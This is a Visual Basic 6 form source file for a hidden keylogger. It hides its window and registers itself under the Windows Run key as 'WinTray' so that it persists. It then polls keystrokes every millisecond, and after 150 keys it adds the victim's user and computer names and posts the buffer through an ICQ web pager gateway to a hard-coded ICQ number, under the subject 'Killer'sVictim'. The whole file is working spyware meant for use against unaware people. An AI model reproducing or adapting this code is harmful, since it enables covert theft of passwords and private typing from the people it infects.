VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form main 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "hmmmmmmmmmmmm!!!!!!!"
   ClientHeight    =   3210
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5385
   Icon            =   "main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3210
   ScaleWidth      =   5385
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer tm1 
      Interval        =   1
      Left            =   4800
      Top             =   600
   End
   Begin MSWinsockLib.Winsock ws1 
      Left            =   4800
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Image Image1 
      Height          =   2250
      Left            =   120
      Picture         =   "main.frx":030A
      Top             =   120
      Width           =   4500
   End
   Begin VB.Label lb 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C00000&
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   2760
      Width           =   5175
   End
End
Attribute VB_Name = "main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim v(44)
Dim stg(1000) As String

Dim chkc
Dim ctr, tmr
Dim usrname, pcname
Dim msg
Dim msgd
Dim t, s, n, m, c, q, p, z

Dim response

Dim tx1, tx2







Private Sub Form_Load()

Dim dummy

If App.PrevInstance = True Then
  Unload Me
  End
End If


HideApp
dummy = bSetRegValue(&H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WinTray", "c:\windows\syskernel.exe")


ctr = 0
tx1 = ""



End Sub

Private Sub tm1_Timer()

v(1) = GetAsyncKeyState(VK_0)
v(2) = GetAsyncKeyState(VK_1)
v(3) = GetAsyncKeyState(VK_2)
v(4) = GetAsyncKeyState(VK_3)
v(5) = GetAsyncKeyState(VK_4)
v(6) = GetAsyncKeyState(VK_5)
v(7) = GetAsyncKeyState(VK_6)
v(8) = GetAsyncKeyState(VK_7)
v(9) = GetAsyncKeyState(VK_8)
v(10) = GetAsyncKeyState(VK_9)
v(11) = GetAsyncKeyState(VK_A)
v(12) = GetAsyncKeyState(VK_B)
v(13) = GetAsyncKeyState(VK_C)
v(14) = GetAsyncKeyState(VK_D)
v(15) = GetAsyncKeyState(VK_E)
v(16) = GetAsyncKeyState(VK_F)
v(17) = GetAsyncKeyState(VK_G)
v(18) = GetAsyncKeyState(VK_H)
v(19) = GetAsyncKeyState(VK_I)
v(20) = GetAsyncKeyState(VK_J)
v(21) = GetAsyncKeyState(VK_K)
v(22) = GetAsyncKeyState(VK_L)
v(23) = GetAsyncKeyState(VK_M)
v(24) = GetAsyncKeyState(VK_N)
v(25) = GetAsyncKeyState(VK_O)
v(26) = GetAsyncKeyState(VK_P)
v(27) = GetAsyncKeyState(VK_Q)
v(28) = GetAsyncKeyState(VK_R)
v(29) = GetAsyncKeyState(VK_S)
v(30) = GetAsyncKeyState(VK_T)
v(31) = GetAsyncKeyState(VK_U)
v(32) = GetAsyncKeyState(VK_V)
v(33) = GetAsyncKeyState(VK_W)
v(34) = GetAsyncKeyState(VK_X)
v(35) = GetAsyncKeyState(VK_Y)
v(36) = GetAsyncKeyState(VK_Z)
v(36) = GetAsyncKeyState(VK_Z)
v(37) = GetAsyncKeyState(VK_SPACE)
v(38) = GetAsyncKeyState(VK_RETURN)

v(39) = GetAsyncKeyState(VK_LEFT)
v(40) = GetAsyncKeyState(VK_UP)
v(41) = GetAsyncKeyState(VK_RIGHT)
v(42) = GetAsyncKeyState(VK_DOWN)
v(43) = GetAsyncKeyState(VK_BACK)
v(44) = GetAsyncKeyState(VK_DELETE)

'--------------------------------------------------------
If ctr = 0 Then
  For t = 0 To 44
     v(t) = &H0
  Next
  ctr = 1
End If
'--------------------------------------------------------

If (v(1) And &H1) = &H1 Then
  tx1 = tx1 + "0"
  ctr = ctr + 1
End If
If (v(2) And &H1) = &H1 Then
  tx1 = tx1 + "1"
  ctr = ctr + 1
End If
If (v(3) And &H1) = &H1 Then
  tx1 = tx1 + "2"
  ctr = ctr + 1
End If
If (v(4) And &H1) = &H1 Then
  tx1 = tx1 + "3"
  ctr = ctr + 1
End If
If (v(5) And &H1) = &H1 Then
  tx1 = tx1 + "4"
  ctr = ctr + 1
End If
If (v(6) And &H1) = &H1 Then
  tx1 = tx1 + "5"
  ctr = ctr + 1
End If
If (v(7) And &H1) = &H1 Then
  tx1 = tx1 + "6"
  ctr = ctr + 1
End If
If (v(8) And &H1) = &H1 Then
  tx1 = tx1 + "7"
  ctr = ctr + 1
End If
If (v(9) And &H1) = &H1 Then
  tx1 = tx1 + "8"
  ctr = ctr + 1
End If
If (v(10) And &H1) = &H1 Then
  tx1 = tx1 + "9"
  ctr = ctr + 1
End If
If (v(11) And &H1) = &H1 Then
  tx1 = tx1 + "a"
  ctr = ctr + 1
End If
If (v(12) And &H1) = &H1 Then
  tx1 = tx1 + "b"
  ctr = ctr + 1
End If
If (v(13) And &H1) = &H1 Then
  tx1 = tx1 + "c"
  ctr = ctr + 1
End If
If (v(14) And &H1) = &H1 Then
  tx1 = tx1 + "d"
  ctr = ctr + 1
End If
If (v(15) And &H1) = &H1 Then
  tx1 = tx1 + "e"
  ctr = ctr + 1
End If
If (v(16) And &H1) = &H1 Then
  tx1 = tx1 + "f"
  ctr = ctr + 1
End If
If (v(17) And &H1) = &H1 Then
  tx1 = tx1 + "g"
  ctr = ctr + 1
End If
If (v(18) And &H1) = &H1 Then
  tx1 = tx1 + "h"
  ctr = ctr + 1
End If
If (v(19) And &H1) = &H1 Then
  tx1 = tx1 + "i"
  ctr = ctr + 1
End If
If (v(20) And &H1) = &H1 Then
  tx1 = tx1 + "j"
  ctr = ctr + 1
End If
If (v(21) And &H1) = &H1 Then
  tx1 = tx1 + "k"
  ctr = ctr + 1
End If
If (v(22) And &H1) = &H1 Then
  tx1 = tx1 + "l"
  ctr = ctr + 1
End If
If (v(23) And &H1) = &H1 Then
  tx1 = tx1 + "m"
  ctr = ctr + 1
End If
If (v(24) And &H1) = &H1 Then
  tx1 = tx1 + "n"
  ctr = ctr + 1
End If
If (v(25) And &H1) = &H1 Then
  tx1 = tx1 + "o"
  ctr = ctr + 1
End If
If (v(26) And &H1) = &H1 Then
  tx1 = tx1 + "p"
  ctr = ctr + 1
End If
If (v(27) And &H1) = &H1 Then
  tx1 = tx1 + "q"
  ctr = ctr + 1
End If
If (v(28) And &H1) = &H1 Then
  tx1 = tx1 + "r"
  ctr = ctr + 1
End If
If (v(29) And &H1) = &H1 Then
  tx1 = tx1 + "s"
  ctr = ctr + 1
End If
If (v(30) And &H1) = &H1 Then
  tx1 = tx1 + "t"
  ctr = ctr + 1
End If
If (v(31) And &H1) = &H1 Then
  tx1 = tx1 + "u"
  ctr = ctr + 1
End If
If (v(32) And &H1) = &H1 Then
  tx1 = tx1 + "v"
  ctr = ctr + 1
End If
If (v(33) And &H1) = &H1 Then
  tx1 = tx1 + "w"
  ctr = ctr + 1
End If
If (v(34) And &H1) = &H1 Then
  tx1 = tx1 + "x"
  ctr = ctr + 1
End If
If (v(35) And &H1) = &H1 Then
  tx1 = tx1 + "y"
  ctr = ctr + 1
End If
If (v(36) And &H1) = &H1 Then
  tx1 = tx1 + "z"
  ctr = ctr + 1
End If

If (v(37) And &H1) = &H1 Then
  tx1 = tx1 + " "
  ctr = ctr + 1
End If
If (v(38) And &H1) = &H1 Then
  tx1 = tx1 + Chr(13) + Chr(10)
End If

'tx1.SelStart = Len(tx1)

'If (v39 And &H1) = &H1 Then
'  Chr (37)
'End If
'If (v40 And &H1) = &H1 Then
'  Chr (38)
'End If
'If (v41 And &H1) = &H1 Then
'  Chr (39)
'End If
'If (v42 And &H1) = &H1 Then
'  Chr (40)
'End If
'If (v43 And &H1) = &H1 Then
'  Chr (8)
'End If
'If (v44 And &H1) = &H1 Then
'  Chr (6)
'End If

If ctr >= 150 Then
  chc
  myinfo
  ctr = 1
End If

End Sub



Public Sub myinfo()


Dim compname As String, retval As Long
Dim username As String
Dim slength As Long

Dim windir As String


compname = Space(255)
retval = GetComputerName(compname, 255)

compname = Left(compname, InStr(compname, vbNullChar) - 1)
pcname = compname

username = Space(255)
slength = 255

retval = GetUserName(username, slength)
username = Left(username, slength - 1)

usrname = username
tx2 = tx2 + "My name is :" + "(" + usrname + ")" + "My computer name is:" + "(" + pcname + ")" + Chr(13) + Chr(10)

tx2 = tx2 + tx1

If chkc = True Then
  sendpager
End If

If chkc = False Then
  tx2 = "": tx1 = ""
End If
  
End Sub

Public Sub sendpager()

If ws1.State <> 0 Then
  ws1.Close
End If                                                                                                  'here you put your icq#
msgd = "from=anonymous&fromemail=mail@from.com&subject=" & "Killer'sVictim" & "&body=" & tx2 & "&to=" & "8605413" & "&Send=" & """"
msg = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
msg = msg & "Referer: http://wwp.mirabilis.com" & vbCrLf
msg = msg & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
msg = msg & "Connection: Keep-Alive" & vbCrLf
msg = msg & "Host: wwp.mirabilis.com:80" & vbCrLf
msg = msg & "Content-type: application/x-www-form-urlencoded" & vbCrLf
msg = msg & "Content-length: " & Len(msgd) & vbCrLf
msg = msg & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
msg = msg & msgd & vbCrLf & vbCrLf & vbCrLf & vbCrLf



ws1.Connect "wwp.mirabilis.com", 80
lb.Caption = "Connecting.."

'tmr = Timer
'Do Until ws1.State = 7
'  If Timer > tmr + 50 Then
'    lb.Caption = "Can't connect to server.."
'    ws1.Close
'    ctr = 1
'    tx1 = "": tx2 = ""
'  End If
'  DoEvents
'Loop


End Sub

Private Sub ws1_Connect()

lb.Caption = "Connected.."
ws1.SendData msg 'ws1.Tag


End Sub

Private Sub ws1_SendComplete()

lb.Caption = "Data sended.."

tx1 = "": tx2 = ""
msg = ""
ws1.Close


End Sub

Private Sub ws1_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)

lb.Caption = "Sending data.."

End Sub

Public Sub chc()

chkc = IsNetConnectOnline


End Sub
